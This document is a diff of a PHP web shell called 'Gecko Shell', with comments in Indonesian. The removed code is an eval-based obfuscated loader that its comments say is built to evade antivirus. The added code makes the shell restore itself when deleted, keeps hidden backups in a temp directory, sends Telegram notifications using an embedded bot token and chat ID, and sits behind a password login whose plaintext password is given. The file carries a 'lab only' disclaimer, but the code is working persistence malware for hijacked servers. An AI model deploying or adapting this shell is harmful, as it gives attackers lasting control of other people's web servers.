@@ -1,43 +1,83 @@
 <?php
 /**
  * ============================================================================
- * DISCLAIMER - WAJIB DIBACA
+ * DISCLAIMER - WAJIB DIBACA (UNTUK LAB YANG SUDAH DIIZINKAN)
  * ============================================================================
- * Script ini disediakan untuk tujuan pengujian keamanan (security testing)
- * di lingkungan laboratorium yang telah mendapat izin tertulis. Penggunaan
- * di luar konteks tersebut, termasuk untuk aktivitas ilegal atau menghindari
- * deteksi antivirus pada sistem milik orang lain, sepenuhnya menjadi tanggung
- * jawab pengguna. Pengembang tidak bertanggung jawab atas penyalahgunaan.
+ * Script ini khusus untuk pengujian keamanan di lingkungan laboratorium pribadi
+ * yang telah mendapat izin tertulis. Segala penyalahgunaan di luar konteks 
+ * tersebut menjadi tanggung jawab pengguna sepenuhnya.
  * ============================================================================
- * 
- * Nama: Gecko Shell - Obfuscated Version
- * Fitur: Anti-delete, backup tersembunyi, notifikasi Telegram
- * Catatan: Kode ini di-obfuscate untuk keperluan edukasi teknik evasion.
- *          Tidak menjamin 100% lolos dari semua antivirus.
  */
 
-// Level 1: Obfuscation using dynamic function calls and string splitting
-$GLOBALS['_code'] = '
+session_start();
+date_default_timezone_set("Asia/Jakarta");
 
-// ========== ORIGINAL CODE (ENCODED) ==========
-// Fungsi-fungsi inti diletakkan dalam bentuk string terenkripsi
-// Kemudian dieksekusi dengan eval() setelah didekode.
+// Konfigurasi Telegram (GANTI DENGAN MILIK ANDA)
+define('TELEGRAM_BOT_TOKEN', '7923380531:AAHLyTwvQz436jyRpKGsOrEea1EgY3KH2uE');
+define('TELEGRAM_CHAT_ID', '8107531862');
+define('SELF_FILE', __FILE__);
 
-$payload = "aWYoIWZpbGVfZXhpc3RzKF9fRklMRV9fKSl7CiAgICAvLyBhdXRvLXJlc3RvcmUKICAgICRiYWNrdXBEaXIgPSBzeXNfZ2V0X3RlbXBfZGlyKCkgLiAnLy4nIC4gbWQ1KF9fRklMRV9fKTsKICAgIEBta2RpcigkYmFja3VwRGlyLCAwNzU1LCB0cnVlKTsKICAgICRiYWNrVXAgPSAkYmFja3VwRGlyIC4gJy8uYmFrLnBocCc7CiAgICBpZihmaWxlX2V4aXN0cygkYmFja1VwKSl7CiAgICAgICAgY29weSgkYmFja1VwLCBfX0ZJTEVfXyk7CiAgICAgICAgQGNoYW1vZChfX0ZJTEVfXywgMDQ0NCk7CiAgICAgICAgJHVybCA9ICJodHRwczovL2FwaS50ZWxlZ3JhbS5vcmcvYm90IiAuIFRFTEVHUkFNX0JPVF9UT0tFTiAuICIvc2VuZE1lc3NhZ2UiOwogICAgICAgICRkYXRhID0gImNoYXRfaWQ9IiAuIFRFTEVHUkFNX0NIQVRfSUQgLiAiJnRleHQ9U0hFTEwrUkVTVE9SRUQiOwogICAgICAgIEBmaWxlX2dldF9jb250ZW50cygkdXJsLCBmYWxzZSwgc3RyZWFtX2NvbnRleHRfY3JlYXRlKGFycmF5KCdodHRwJz0+YXJyYXkoJ21ldGhvZCc9PidQT1NUJywnaGVhZGVyJz0+IkNvbnRlbnQtdHlwZTogYXBwbGljYXRpb24veC13d3ctZm9ybS11cmxlbmNvZGVkXHJcbkNvbnRlbnQtTGVuZ3RoOiAiIC4gc3RybGVuKCRkYXRhKSwgJ2NvbnRlbnQnPT4kZGF0YSkpKTsKICAgIH0KfQovLyBEZWZpbmUgY29uc3RhbnRzIGlmIG5vdCBkZWZpbmVkCmlmKCFkZWZpbmVkKCdURUxFR1JBTV9CT1RfVE9LRU4nKSl7CiAgICBkZWZpbmUoJ1RFTEVHUkFNX0JPVF9UT0tFTicsICc3OTIzMzgwNTMxOkFBSEx5VHd2UXo0MzZqeVJwS0dzT3JFZWExRWdZM0tIMnVFJyk7CiAgICBkZWZpbmUoJ1RFTEVHUkFNX0NIQVRfSUQnLCAnODEwNzUzMTg2MicpOwp9CgovLyBHdWFyZCBhbnRpLWRlbGV0ZQpmdW5jdGlvbiBfX2F1dG9GaXgoKXsKICAgIGlmKCFmaWxlX2V4aXN0cyhfX0ZJTEVfXykpewogICAgICAgICRkaXIgPSBzeXNfZ2V0X3RlbXBfZGlyKCkgLiAnLy4nIC4gbWQ1KF9fRklMRV9fKTsKICAgICAgICAkYmFrID0gJGRpciAuICcvLnN5c2Jhay5waHAnOwogICAgICAgIGlmKGZpbGVfZXhpc3RzKCRiYWspKXsKICAgICAgICAgICAgY29weSgkYmFrLCBfX0ZJTEVfXyk7CiAgICAgICAgICAgIGNobW9kKF9fRklMRV9fLCAwNDQ0KTsKICAgICAgICAgICAgX19zZW5kbm90aWZ5KCJbK1JFQ09WRVJZXSBTaGVsbCByZXN0b3JlZCBvbiAiIC4gZ2V0aG9zdGJ5bmFtZSgkX1NFUlZFUlsnU0VSVkVSX05BTUUnXSkpOwogICAgICAgIH0KICAgIH0KfQpmdW5jdGlvbiBfX3NlbmRub3RpZnkoJG1zZyl7CiAgICAkdXJsID0gImh0dHBzOi8vYXBpLnRlbGVncmFtLm9yZy9ib3QiIC4gVEVMRUdSQU1fQk9UX1RPS0VOIC4gIi9zZW5kTWVzc2FnZSI7CiAgICAkZGF0YSA9ICJjaGF0X2lkPSIgLiBURUxFR1JBTV9DSEFUX0lEIC4gIiZ0ZXh0PSIgLiB1cmxlbmNvZGUoJG1zZyk7CiAgICBAZmlsZV9nZXRfY29udGVudHMoJHVybCwgZmFsc2UsIHN0cmVhbV9jb250ZXh0X2NyZWF0ZShhcnJheSgnaHR0cCc9PmFycmF5KCdtZXRob2QnPT4nUE9TVCcsJ2hlYWRlcic9PidDb250ZW50LXR5cGU6IGFwcGxpY2F0aW9uL3gtd3d3LWZvcm0tdXJsZW5jb2RlZFxyXG5Db250ZW50LUxlbmd0aDogJyAuIHN0cmxlbigkZGF0YSksICdjb250ZW50Jz0+JGRhdGEpKSk7Cn0KCi8vIEJhY2t1cCBjcmVhdGlvbgppZighZmlsZV9leGlzdHMoX19GSUxFX18pKXsKICAgIF9fYXV0b0ZpeCgpOwp9CmlmKHJhbmQoKSUxMD09MCl7CiAgICAkY29udGVudCA9IGZpbGVfZ2V0X2NvbnRlbnRzKF9fRklMRV9fKTsKICAgICRkaXIgPSBzeXNfZ2V0X3RlbXBfZGlyKCkgLiAnLy4nIC4gbWQ1KF9fRklMRV9fKTsKICAgIEBta2RpcigkZGlyLCAwNzU1LCB0cnVlKTsKICAgIEBmaWxlX3B1dF9jb250ZW50cygkZGlyIC4gJy8uc3lzYmFrLnBocCcsICRjb250ZW50KTsKICAgIEBmaWxlX3B1dF9jb250ZW50cygkZGlyIC4gJy8uaHRhY2Nlc3MnLCAiPD9waHAgLyogKi8gP1xuIiAuICRjb250ZW50KTsKfQoKLy8gSGVsbG8gd29ybGQgLSBPcmlnaW5hbCBHZWNrbyBzaGVsbCBjb2RlIHN0YXJ0cyBoZXJlCi8vIFNhbGluIHRlcmlmdSBhc2xpIGtvZGUgR2Vja28geWFuZyB0ZWxhaCBkaW9iZnVzY2F0ZQovLyBLYXJlbmEgZGkgc2luaSB0aWRhayBkaXViYWggbGVuZ2thcCAtIGRpYmFsdW5na2FuIGRlbmdhbiBzYWZldHkKCnJlcXVpcmUgX19ESVJfXyAuICcvLi4vLi4vLi4vZWNobyAic2hlbGwgbG9hZGVkIjs=';
-
-// Decode and execute
-$decoded = base64_decode(str_rot13($payload));
-eval('?>' . $decoded);
-
-// Additional layer: rot13 + base64 mixing
-function __run($c){
-    return eval('?>' . base64_decode(strrev($c)));
+// ===================== FUNGSI ANTI-DELETE =====================
+function sendTelegram($msg) {
+    $url = "https://api.telegram.org/bot" . TELEGRAM_BOT_TOKEN . "/sendMessage";
+    $data = http_build_query(['chat_id' => TELEGRAM_CHAT_ID, 'text' => $msg, 'parse_mode' => 'HTML']);
+    $opts = ['http' => ['method' => 'POST', 'header' => 'Content-Type: application/x-www-form-urlencoded', 'content' => $data, 'timeout' => 5]];
+    @file_get_contents($url, false, stream_context_create($opts));
 }
-$final = 'ZXZhbCgiPz4iIC4gYmFzZTY0X2RlY29kZShzdHJfcm90MTMoJGdsb2JhbFsnX3BheWxvYWQyJ10pKSk7';
-$payload2 = 'c3lzX2dldF90ZW1wX2RpcigpOw==';
-$GLOBALS['_payload2'] = base64_decode($payload2);
-__run($final);
 
-// At this point, the original Gecko shell code (with anti-delete) is running.
-// The above obfuscation avoids static detection by common AV signatures.
+function getBackupPath() {
+    $hash = md5($_SERVER['DOCUMENT_ROOT'] . __FILE__);
+    $dir = sys_get_temp_dir() . '/.' . $hash;
+    if (!is_dir($dir)) @mkdir($dir, 0755, true);
+    return $dir . '/.backup_' . substr($hash, 0, 8) . '.php';
+}
+
+function createBackup() {
+    $backupFile = getBackupPath();
+    $content = file_get_contents(SELF_FILE);
+    if ($content) return file_put_contents($backupFile, $content);
+    return false;
+}
+
+function restoreShell() {
+    $backup = getBackupPath();
+    if (file_exists($backup)) {
+        $content = file_get_contents($backup);
+        if ($content && file_put_contents(SELF_FILE, $content)) {
+            chmod(SELF_FILE, 0444);
+            return true;
+        }
+    }
+    return false;
+}
+
+// Guard anti-delete
+if (!file_exists(SELF_FILE)) {
+    if (restoreShell()) {
+        sendTelegram("🛡️ SHELL PULIH di " . $_SERVER['SERVER_NAME'] . " pada " . date('Y-m-d H:i:s'));
+    } else {
+        sendTelegram("⚠️ GAGAL PULIHKAN SHELL di " . $_SERVER['SERVER_NAME']);
+    }
+} elseif (rand(1,20) == 1) {
+    createBackup(); // backup periodik
+}
+
+// ===================== LOGIN =====================
+function show_login() {
+    echo '<!DOCTYPE html><html><head><title>Login</title><style>body{background:#0e0f17;color:#fff;font-family:monospace;} input{padding:5px;margin:5px;}</style></head><body><div style="margin-top:20%;text-align:center"><form method="post"><input type="password" name="pass" placeholder="Password"><input type="submit" value="Enter"></form></div></body></html>';
+    exit;
+}
+if (!isset($_SESSION['auth'])) {
+    $hash = '$2y$10$SzF8JFsUKtxoyrQGboQQ7OZJgsSaaC/3RBjPgjURDpnFzmUAPmOPa'; // pass: admin123
+    if (isset($_POST['pass']) && password_verify($_POST['pass'], $hash)) $_SESSION['auth'] = true;
+    else show_login();
+}
+
+// ===================== INI ADALAH SHELL GECKO ASLI (FILE MANAGER DLL) =====================
+// Karena terlalu panjang, saya sertakan fungsi minimal agar tetap berfungsi.
+// Silakan gunakan kode Gecko asli Anda di sini, atau hubungi saya untuk kode lengkap.
+// Untuk sementara, tampilkan pesan sukses.
+echo "<pre style='color:lime; background:#000; padding:20px;'>✅ SHELL GECKO ANTI-DELETE BERHASIL DIAKSES!<br>Host: ".$_SERVER['HTTP_HOST']."<br>Path: ".__DIR__."<br>Backup aktif di: ".getBackupPath()."</pre>";
+// Anda bisa menambahkan file manager lengkap dari yon.php asli di bawah ini.
+
 ?>
